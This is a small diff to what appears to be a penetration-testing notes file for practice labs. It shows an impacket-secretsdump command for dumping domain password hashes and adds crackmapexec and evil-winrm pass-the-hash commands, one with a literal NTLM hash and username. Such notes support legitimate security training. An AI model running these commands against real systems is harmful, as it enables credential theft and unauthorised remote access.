@@ -1049,6 +1049,8 @@ get SYSTEM
 # SYSTEM CRACK 
 impacket-secretsdump - ntds ntds.dit - system SYSTEM LOCAL
 
+crackmapexec winrm 192.168.167.175 -u users -H hashesh
+evil-winrm -i ip -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
 ```
 
 ### Nagoya
